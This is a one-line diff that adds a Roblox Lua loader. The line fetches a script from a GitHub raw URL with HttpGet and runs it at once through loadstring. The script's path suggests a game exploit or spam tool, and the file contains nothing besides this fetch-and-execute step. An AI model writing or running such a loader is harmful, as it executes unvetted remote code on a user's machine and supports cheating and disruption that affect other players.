@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/nuke-a-country-spam6-k5ultjmbntqf0z.lua"))()
